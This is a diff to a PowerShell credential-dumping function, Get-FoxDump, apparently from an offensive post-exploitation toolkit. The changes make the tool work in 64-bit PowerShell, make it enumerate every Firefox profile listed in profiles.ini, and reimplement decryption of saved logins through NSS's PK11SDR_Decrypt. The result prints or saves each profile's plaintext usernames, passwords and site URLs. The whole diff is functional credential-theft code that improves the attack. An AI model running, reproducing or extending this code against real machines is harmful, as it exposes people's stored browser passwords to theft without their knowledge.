@@ -765,7 +765,7 @@ Function Get-FoxDump
 
     $TSECItem = struct $Mod TSECItem @{
         SECItemType    =    field 0 Int
-        SECItemData    =    field 1 Int
+        SECItemData    =    field 1 IntPtr
         SECItemLen     =    field 2 Int
     }
 
@@ -776,45 +776,27 @@ Function Get-FoxDump
 
     if([IntPtr]::Size -eq 8)
     {
-        Throw "Unable to load 32-bit dll's in 64-bit process."
+        $mozillapath = "C:\Program Files\Mozilla Firefox"
     }
-    $mozillapath = "C:\Program Files (x86)\Mozilla Firefox"
+    elseif([IntPtr]::Size -eq 4)
+    {        
+        $mozillapath = "C:\Program Files (x86)\Mozilla Firefox"
+    }
 
     If(Test-Path $mozillapath)
     {
 
 
         $nss3dll = "$mozillapath\nss3.dll"
-
         $mozgluedll = "$mozillapath\mozglue.dll"
-        $msvcr120dll = "$mozillapath\msvcr120.dll"
-        $msvcp120dll = "$mozillapath\msvcp120.dll"
 
-        if(Test-Path $msvcr120dll)
-        {
-
-            $msvcr120dllHandle = $Kernel32::LoadLibrary($msvcr120dll)
-            $LastError= [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-            Write-Verbose "Last Error when loading mozglue.dll: $LastError"
-
-
-        }
-
-        if(Test-Path $msvcp120dll)
-        {
-
-            $msvcp120dllHandle = $kernel32::LoadLibrary($msvcp120dll)
-            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-            Write-Verbose "Last Error loading mscvp120.dll: $LastError"
-
-        }
 
         if(Test-Path $mozgluedll)
         {
 
             $mozgluedllHandle = $Kernel32::LoadLibrary($mozgluedll)
             $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-            Write-Verbose "Last error loading msvcr120.dll: $LastError"
+            Write-Verbose "Last error loading mozglue.dll: $LastError"
 
         }
 
@@ -846,14 +828,15 @@ Function Get-FoxDump
             [string]$cipherText
         )
 
-        #Cast the result from the Decode buffer function as a TSECItem struct and create an empty struct. Decrypt the cipher text and then
-        #store it inside the empty struct.
-        $Result = $NSSBase64_DecodeBuffer.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $cipherText, $cipherText.Length)
-        Write-Verbose "[+]NSSBase64_DecodeBuffer Result: $Result"
-        $ResultPtr = $Result -as [IntPtr]
-        $offset = $ResultPtr.ToInt64()
-        $newptr = New-Object System.IntPtr -ArgumentList $offset
-        $TSECStructData = $newptr -as $TSECItem
+        $Bytes = [System.Convert]::FromBase64String($cipherText)
+        $Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Bytes.Length)
+        [System.Runtime.InteropServices.Marshal]::Copy($Bytes, 0, $Buffer, $Bytes.Length)
+
+        $TSECStructData = New-Object TSECItem
+        $TSECStructData.SECItemType = 0
+        $TSECStructData.SECItemData = $Buffer
+        $TSECStructData.SECItemLen = $Bytes.Length
+
         $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($TSECStructData))
         $EmptyTSECItem = $ptr -as $TSECItem
         $result = $PK11SDR_Decrypt.Invoke([ref]$TSECStructData, [ref]$EmptyTSECItem, 0)
@@ -876,85 +859,168 @@ Function Get-FoxDump
     }
 
     $NSSInitAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSS_Init")
-    $NSSInitDelegates = Get-DelegateType @([string]) ([long])
+    $NSSInitDelegates = Get-DelegateType @([string]) ([int])
     $NSS_Init = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSInitAddr, $NSSInitDelegates)
 
-    $NSSBase64_DecodeBufferAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSSBase64_DecodeBuffer")
-    $NSSBase64_DecodeBufferDelegates = Get-DelegateType @([IntPtr], [IntPtr], [string], [int]) ([int])
-    $NSSBase64_DecodeBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSBase64_DecodeBufferAddr, $NSSBase64_DecodeBufferDelegates)
-
+    $NSSShutdownAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSS_Shutdown")
+    $NSSShutdownDelegates = Get-DelegateType @() ([int])
+    $NSS_Shutdown = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSShutdownAddr, $NSSShutdownDelegates)
+    
     $PK11SDR_DecryptAddr = $Kernel32::GetProcAddress($nssdllhandle, "PK11SDR_Decrypt")
     $PK11SDR_DecryptDelegates = Get-DelegateType @([Type]$TSECItem.MakeByRefType(),[Type]$TSECItem.MakeByRefType(), [int]) ([int])
     $PK11SDR_Decrypt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PK11SDR_DecryptAddr, $PK11SDR_DecryptDelegates)
 
-    $profilePath = "$($env:APPDATA)\Mozilla\Firefox\Profiles\*.default"
-
-    $defaultProfile = $(Get-ChildItem $profilePath).FullName
-    $NSSInitResult = $NSS_Init.Invoke($defaultProfile)
-    Write-Verbose "[+]NSS_Init result: $NSSInitResult"
-
-
-    if(Test-Path $defaultProfile)
+    $FirefoxRoot = "$($env:APPDATA)\Mozilla\Firefox"
+    $ProfilesIniPath = Join-Path $FirefoxRoot "profiles.ini"
+    $ProfilePaths = @()
+    if (Test-Path $ProfilesIniPath) 
     {
-        #Web.extensions assembly is necessary for handling json files
-        try
+        $ProfilesIniContent = Get-Content $ProfilesIniPath -Raw
+        # $ProfileSections = [regex]::Split($ProfilesIniContent, "(?m)(?=\[Profile)") | Where-Object { $_ -match "Path="}
+        $ProfileSections = $ProfilesIniContent -split "(?m)^(?=\[Profile)"
+        
+        foreach ($ProfileSection in $ProfileSections)
         {
-           Add-Type -AssemblyName System.web.extensions
-        }
-        catch
-        {
-            Write-Warning "Unable to load System.web.extensions assembly"
-            break
-        }
-
-
-        $jsonFile = Get-Content "$defaultProfile\logins.json"
-        if(!($jsonFile))
-        {
-            Write-Warning "Login information cannot be found in logins.json"
-            break
-        }
-        $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer
-        $obj = $ser.DeserializeObject($jsonFile)
-
-
-        $logins = $obj['logins']
-        $count = ($logins.Count) - 1
-        $passwordlist = @()
-        #Iterate through each login entry and decrypt the username and password fields
-        for($i = 0; $i -le $count; $i++)
-        {
-            Write-Verbose "[+]Decrypting login information..."
-            $user = Decrypt-CipherText $($logins.GetValue($i)['encryptedUsername'])
-            $pass = Decrypt-CipherText $($logins.GetValue($i)['encryptedPassword'])
-            $formUrl = $($logins.GetValue($i)['formSubmitURL'])
-            $FoxCreds = New-Object PSObject -Property @{
-                UserName = $user
-                Password = $pass
-                URL = $formUrl
+            # Skip sections that don't have a Path field, like [General]
+            if ($ProfileSection -notmatch "Path=") { continue }
+            
+            $PathMatch = [regex]::Match($ProfileSection, "Path=(.+?)\r\n")
+            $RelativeMatch = [regex]::Match($ProfileSection, "IsRelative=(0|1)")
+            
+            if ($PathMatch.Success)
+            {
+                $RawPath = $PathMatch.Groups[1].Value
+                $IsRelative = $RelativeMatch.Groups[1].Value
+                Write-Verbose "Raw path: $RawPath. is relative? $IsRelative"
+                if ($IsRelative)
+                {
+                    $ProfilePath = Join-Path $FirefoxRoot $RawPath
+                }
+                else
+                {
+                    $ProfilePath = $RawPath
+                }
+                $ProfilePaths += $ProfilePath
             }
-            $passwordlist += $FoxCreds
         }
-        #Spit out the results to a file.... or not.
-        if($OutFile)
-        {
-            $passwordlist | Format-List URL, UserName, Password | Out-File -Encoding ascii $OutFile
-        }
-        else
-        {
-            $passwordlist | Format-List URL, UserName, Password | Out-String
-        }
-
-        $kernel32::FreeLibrary($msvcp120dllHandle) | Out-Null
-        $Kernel32::FreeLibrary($msvcr120dllHandle) | Out-Null
-        $kernel32::FreeLibrary($mozgluedllHandle) | Out-Null
-        $kernel32::FreeLibrary($nssdllhandle) | Out-Null
-
     }
     else
     {
-        Write-Warning "Unable to locate default profile"
+        Throw "Unable to load Mozilla profiles.ini"
+    }
+    
+    if ($OutFile)
+    {
+        "" | Out-File -Encoding ascii $OutFile
+    }    
+    
+    foreach ($profilePath in $ProfilePaths)
+    {        
+        if (Test-Path $profilePath)
+        {
+            try
+            {
+                if($OutFile)
+                {
+                    ("-" * 80) | Out-File -Encoding ascii $OutFile -Append
+                    "Profile: $profilePath" | Out-File -Encoding ascii $OutFile -Append   
+                }
+                else
+                {
+                    ("-" * 80) | Out-String
+                    "Profile: $profilePath" | Out-String
+                }
+                
+            
+                Write-Verbose "[+]Checking passwords for profile $profilePath"
+                $NSSInitResult = $NSS_Init.Invoke($profilePath)
+                Write-Verbose "[+]NSS_Init result: $NSSInitResult"
+                 #Web.extensions assembly is necessary for handling json files
+                try
+                {
+                   Add-Type -AssemblyName System.web.extensions
+                }
+                catch
+                {
+                    Write-Warning "Unable to load System.web.extensions assembly"
+                    break
+                }
+
+                $loginsJsonPath = Join-Path $profilePath "logins.json"
+                if (-Not (Test-Path $loginsJsonPath))
+                {
+                    Write-Warning "logins.json cannot be found"
+                    continue
+                }
+                $jsonFile = Get-Content $loginsJsonPath
+                if(!($jsonFile))
+                {
+                    Write-Warning "Login information cannot be found in logins.json"
+                    continue
+                }
+                $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer
+                $obj = $ser.DeserializeObject($jsonFile)
+
+
+                $logins = $obj['logins']
+                $count = ($logins.Count) - 1
+                $passwordlist = @()
+                #Iterate through each login entry and decrypt the username and password fields
+                for($i = 0; $i -le $count; $i++)
+                {
+                    Write-Verbose "[+]Decrypting login information..."
+                    $user = Decrypt-CipherText $($logins.GetValue($i)['encryptedUsername'])
+                    $pass = Decrypt-CipherText $($logins.GetValue($i)['encryptedPassword'])
+                    $hostname = $($logins.GetValue($i)['hostname'])
+                    $httpRealm = $($logins.GetValue($i)['httpRealm'])
+                    $formUrl = $($logins.GetValue($i)['formSubmitURL'])
+                    $FoxCreds = New-Object PSObject -Property @{
+                        UserName = $user
+                        Password = $pass
+                        Hostname = $hostname
+                        HttpRealm = $httpRealm
+                        URL = $formUrl
+                    }
+                    $passwordlist += $FoxCreds
+                }
+                #Spit out the results to a file.... or not.
+                if($OutFile)
+                {
+                    if($passwordlist.Length -gt 0)
+                    {
+                        $passwordlist | Format-List Hostname, HttpRealm, URL, UserName, Password | Out-File -Encoding ascii $OutFile -Append
+                    }
+                    else
+                    {
+                        "No credentials found" | Out-File -Encoding ascii $OutFile -Append
+                    }                              
+                }
+                else
+                {
+                    if($passwordlist.Length -gt 0)
+                    {
+                        $passwordlist | Format-List Hostname, HttpRealm, URL, UserName, Password | Out-String
+                    }
+                    else
+                    {
+                        "No credentials found" | Out-String
+                    }                    
+                }                           
+            }
+            finally
+            {            
+                $NSSShutdownResult = $NSS_Shutdown.Invoke()
+                Write-Verbose "[+]NSS_Shutdown result: $NSSShutdownResult"            
+            }
+        }
+        else
+        {
+            Write-Warning "Unable to locate profile $profilePath"
+        }
     }
 
-
+    $kernel32::FreeLibrary($mozgluedllHandle) | Out-Null
+    $kernel32::FreeLibrary($nssdllhandle) | Out-Null
+   
 }
+
